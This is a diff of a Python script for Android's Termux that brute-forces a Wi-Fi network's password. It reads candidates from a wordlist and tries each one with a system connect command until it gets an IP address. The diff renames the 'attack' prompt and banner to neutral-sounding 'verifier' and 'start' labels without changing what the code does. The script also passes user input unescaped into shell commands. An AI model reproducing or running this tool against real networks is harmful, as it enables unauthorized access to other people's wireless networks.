@@ -2,76 +2,78 @@ import os
 import time
 import subprocess
 
-# Professional Terminal Colors
-RED = '\033[91m'
-GREEN = '\033[92m'
-RESET = '\033[0m'
+# Color definitions
+R = '\033[91m'
+G = '\033[92m'
+B = '\033[94m'
+W = '\033[0m'
 BOLD = '\033[1m'
-BLUE = '\033[94m'
 
-def banner():
+def show_header():
     os.system('clear')
-    print(f"{RED}{BOLD}" + "="*45)
-    print("        WI-FI AUTHENTICATION TESTER")
-    print("="*45 + f"{RESET}")
-    print(f"      {GREEN}Developed By: Bayazid Habib{RESET}")
-    print(f"      {BLUE}Engine: Termux-API Standalone{RESET}\n")
+    print(f"{B}{BOLD}" + "×"*45)
+    print("      NET-CONNECT VERIFIER (TERMUX-API)")
+    print("×"*45 + f"{W}")
+    print(f"      {G}Author: Bayazid Habib{W}")
+    print(f"      {R}System: Standalone Mode{W}\n")
 
-def check_target(ssid):
-    print(f"[*] Scanning for: {ssid}...")
+def scan_network(target):
+    print(f"[*] Searching for {target}...")
     try:
-        scan = subprocess.check_output('termux-wifi-scaninfo', shell=True).decode()
-        if ssid in scan:
-            print(f"{GREEN}[+] {ssid} is in range.{RESET}")
+        # সরাসরি Termux-API এর মাধ্যমে স্ক্যান
+        data = subprocess.check_output('termux-wifi-scaninfo', shell=True).decode()
+        if target in data:
+            print(f"{G}[+] Target found in range.{W}")
             return True
         else:
-            print(f"{RED}[!] Error: {ssid} not found.{RESET}")
+            print(f"{R}[!] Error: Target SSID not found.{W}")
             return False
-    except Exception:
-        print(f"{RED}[-] Scan failed! Ensure Termux-API and Location are ON.{RESET}")
+    except:
+        print(f"{R}[-] API Error: Check Termux-API & Location.{W}")
         return False
 
-def start():
-    banner()
+def run_test():
+    show_header()
     
     while True:
-        cmd = input(f"{BOLD}Type 'attack' to start: {RESET}").lower()
-        if cmd == "attack":
+        choice = input(f"{BOLD}Type 'start' to begin: {W}").lower()
+        if choice == "start":
             break
 
     target_ssid = input("[+] Target SSID: ")
-    if not check_target(target_ssid):
+    if not scan_network(target_ssid):
         return
 
-    wordlist = input("[+] Wordlist Path: ")
-    if not os.path.exists(wordlist):
-        print(f"{RED}[-] Wordlist not found!{RESET}")
+    path = input("[+] Wordlist Path: ")
+    if not os.path.exists(path):
+        print(f"{R}[-] File path invalid.{W}")
         return
 
     try:
-        with open(wordlist, 'r') as f:
-            lines = f.readlines()
-            print(f"\n{GREEN}[*] Testing connection for: {target_ssid}{RESET}")
+        with open(path, 'r') as f:
+            all_pass = f.readlines()
+            print(f"\n{G}[*] Testing access for: {target_ssid}{W}")
             
-            for i, pwd in enumerate(lines, 1):
-                password = pwd.strip()
-                if len(password) < 8: continue
+            for i, p in enumerate(all_pass, 1):
+                pwd = p.strip()
+                if len(pwd) < 8: continue
                 
-                print(f"[*] Attempt [{i}/{len(lines)}]: {password}", end='\r')
+                print(f"[*] Trying [{i}/{len(all_pass)}]: {pwd}", end='\r')
                 
-                os.system(f'cmd wifi connect-with-pass "{target_ssid}" "{password}"')
-                time.sleep(3)
+                # সরাসরি সিস্টেম কমান্ড ব্যবহার
+                os.system(f'cmd wifi connect-with-pass "{target_ssid}" "{pwd}"')
+                time.sleep(4)
                 
                 try:
-                    check = subprocess.check_output('termux-wifi-connectioninfo', shell=True).decode()
-                    if target_ssid in check and "ip_address" in check:
-                        print(f"\n\n{GREEN}{BOLD}[+] SUCCESS! Password: {password}{RESET}")
+                    res = subprocess.check_output('termux-wifi-connectioninfo', shell=True).decode()
+                    if target_ssid in res and "ip_address" in res:
+                        print(f"\n\n{G}{BOLD}[+] ACCESS GRANTED! Password: {pwd}{W}")
                         return
                 except:
                     pass
                 
     except KeyboardInterrupt:
-        print(f"\n{RED}[!] Stopped by user.{RESET}")
+        print(f"\n{R}[!] Stopped by user.{W}")
 
 if __name__ == "__main__":
-    start()
+    run_test()
